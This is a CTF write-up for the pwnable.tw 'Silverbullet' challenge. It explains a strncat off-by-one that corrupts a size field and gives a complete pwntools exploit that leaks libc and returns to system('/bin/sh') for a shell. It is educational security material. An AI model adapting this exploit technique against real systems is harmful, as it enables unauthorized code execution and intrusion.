# Pwnable.tw - Silverbullet

* Website : Pwnable.tw
* Challenge : Silverbullet
* Writeup author : Redhung aka r3dhun9
>Contact :[Philip Chen (Facebook)](https://www.facebook.com/philip.chen.581)

## 0x00
This is a challenge about **off-by-one** vulneribility. :ok_hand: 

We'll trace the source code of **strncat** later. :+1: 

## 0x01
The first thing we have to do is **checksec** :

![](https://i.imgur.com/aqHQujE.png)

**FULL RELRO** means we cannot overwrite **GOT**.

**No PIE** means we can write the true address by using **objdump**.

Let's use **IDA Pro** to decompile the binary :

There are three functions named **create_bullet**, **power_up** and **beat**.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int menu_choice; // eax
  int wolf_hp; // [esp+0h] [ebp-3Ch]
  const char *wolf_name; // [esp+4h] [ebp-38h]
  SilverBullet bullet; // [esp+8h] [ebp-34h]

  init_proc();
  bullet.size = 0;
  memset(&bullet, 0, 0x30u);
  wolf_hp = 0x7FFFFFFF;
  wolf_name = "Gin";
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          menu_choice = read_int();
          if ( menu_choice != 2 )
            break;
          power_up(&bullet);
        }
        if ( menu_choice > 2 )
          break;
        if ( menu_choice != 1 )
          goto LABEL_16;
        create_bullet(&bullet);
      }
      if ( menu_choice == 3 )
        break;
      if ( menu_choice == 4 )
      {
        puts("Don't give up !");
        exit(0);
      }
LABEL_16:
      puts("Invalid choice");
    }
    if ( beat(&bullet, &wolf_hp) )
      return 0;
    puts("Give me more power !!");
  }
}
```

1. **create_bullet** is a function which creates our bullet by the strlen.

```c
int __cdecl create_bullet(SilverBullet *bullet)
{
  size_t str_len; // ST08_4

  if ( bullet->input[0] )
    return puts("You have been created the Bullet !");
  printf("Give me your description of bullet :");
  read_input(bullet, 48u);
  str_len = strlen(bullet->input);
  printf("Your power is : %u\n", str_len);
  bullet->size = str_len;
  return puts("Good luck !!");
}
```

2. **power_up** is a function which has an **off-by-one** vulneribility. It uses **strncat** to describe our power of bullet, however, **strncat** will add **\x00** after the end of the string, and this could lead to **overflow**.

```c
int __cdecl power_up(SilverBullet *bullet)
{
  SilverBullet newBullet; // [esp+0h] [ebp-34h]

  newBullet.size = 0;
  memset(&newBullet, 0, 0x30u);
  if ( !bullet->input[0] )
    return puts("You need create the bullet first !");
  if ( bullet->size > 47 )
    return puts("You can't power up any more !");
  printf("Give me your another description of bullet :");
  read_input(&newBullet, 48 - bullet->size);
  strncat(bullet->input, newBullet.input, 48 - bullet->size);
  newBullet.size = strlen(newBullet.input) + bullet->size;
  printf("Your new power is : %u\n", newBullet.size);
  bullet->size = newBullet.size;
  return puts("Enjoy it !");
}
```

Let's trace the source code of **strncat**, we can easily see **\x00** is added after the end of the string.

```c
STRNCAT (char *s1, const char *s2, size_t n)
{
  char *s = s1;
  /* Find the end of S1.  */
  s1 += strlen (s1);
  size_t ss = __strnlen (s2, n);
  s1[ss] = '\0';    <-- add \x00 after the end of the string
  memcpy (s1, s2, ss);
  return s;
}
```

3. **beat** is a function which return a value to the main function.

```c
signed int __cdecl beat(SilverBullet *bullet, _DWORD *wolf_hp)
{
  signed int result; // eax

  if ( bullet->input[0] )
  {
    puts(">----------- Werewolf -----------<");
    printf(" + NAME : %s\n", wolf_hp[1]);
    printf(" + HP : %d\n", *wolf_hp);
    puts(">--------------------------------<");
    puts("Try to beat it .....");
    usleep(1000000u);
    *wolf_hp -= bullet->size;
    if ( *wolf_hp <= 0 )
    {
      puts("Oh ! You win !!");
      result = 1;
    }
    else
    {
      puts("Sorry ... It still alive !!");
      result = 0;
    }
  }
  else
  {
    puts("You need create the bullet first !");
    result = 0;
  }
  return result;
}
```

## 0x02
Our thoughts would be clear and shows below:

Input 47 characters to **create_bullet**, and then **power_up** to input one more character, using **strncat** to overwrite the size of bullet.

```c
newBullet.size = strlen(newBullet.input) + bullet->size;
  printf("Your new power is : %u\n", newBullet.size);
```

It equals to **newBullet.size = 1 + \x00 = 1**

So now we can input more 47 characters to overwrite the return address.

We leak the libc address by loop1, and then return to libc by loop2, sweet. :+1: 

## 0x03
Exploit:
```python
from pwn import *

#r = process(['/glibc/2.23/32/lib/ld-2.23.so','./silver_bullet'],env={'LD_PRELOAD':'./libc_32.so.6'})
r = remote('chall.pwnable.tw',10103)

def create():
    r.recvuntil('choice :')
    r.sendline('1')
    r.recvuntil('bullet :')
    r.sendline('a'*47)

def power(p):
    r.recvuntil('choice :')
    r.sendline('2')
    r.recvuntil('bullet :')
    r.sendline(p)

def beat():
    r.recvuntil('choice :')
    r.sendline('3')

def main():
    #first loop to leak the libc address
    create()
    power('b')
    power('b'*7+p32(0x80484a8)+p32(0x08048954)+p32(0x804afd0))
    beat()
    beat()
    r.recvuntil('Oh ! You win !!\n')
    leak = u32(r.recvuntil('\n').strip('\n')[:4])
    libc_base_offset = 0xd41c0
    libc_system_offset = 0x0003a940
    libc_base = leak - libc_base_offset
    libc_system = libc_base + libc_system_offset
    libc_binsh_offset = 0x00158e8b
    libc_binsh = libc_base + libc_binsh_offset
    #second loop to return to libc
    create()
    power('b')
    power('b'*7+p32(libc_system)+p32(libc_system)+p32(libc_binsh))
    beat()
    beat()

if __name__ == '__main__':
    main()
    r.interactive()
```
